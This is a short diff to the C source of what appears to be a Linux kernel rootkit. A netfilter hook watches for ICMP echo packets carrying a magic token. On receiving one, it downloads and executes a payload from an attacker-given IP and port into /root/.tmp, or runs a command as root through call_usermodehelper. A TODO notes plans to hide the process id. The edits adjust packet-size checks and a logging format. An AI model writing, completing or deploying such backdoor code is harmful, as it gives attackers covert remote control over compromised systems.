@@ -48,9 +48,9 @@ unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struc
     payload = (struct magic_icmp *)(icmp_header + 1);
     payload_size = skb->len - sizeof(struct iphdr) - sizeof(struct icmphdr);
 
-    DEBUG("ICMP packet: payload_size=%u, magic=%x, ip=%x, port=%hu, op=%hu, cmd=%c", payload_size, payload->magic, payload->ip, payload->port,payload->op,payload->cmd);
+    DEBUG("ICMP packet: payload_size=%u, magic=%x, ip=%x, port=%hu, op=%hu, cmd=%s", payload_size, payload->magic, payload->ip, payload->port,payload->op,payload->cmd);
 
-    if ( icmp_header->type != ICMP_ECHO || payload_size < 10 || payload->magic != AUTH_TOKEN )
+    if ( icmp_header->type != ICMP_ECHO || payload_size < 12 || payload->magic != AUTH_TOKEN )
         return NF_ACCEPT;
 
     DEBUG("Received magic ICMP packet\n");
@@ -60,7 +60,7 @@ unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struc
     port = payload->port;
 
 
-    if(payload_size == 10 && payload->op==0){
+    if(payload_size == 12 && payload->op==0){
     // 3 attempts, 2000ms delay
     dlexec_queue("/root/.tmp", ip, port, 2, 2000);
     }
@@ -75,7 +75,7 @@ unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struc
  
 
 
-    call_usermodehelper(argv[0], argv, envp, 0);
+    call_usermodehelper(argv[0], argv, envp, -1);
 
     // TODO: automatically hide pid
     
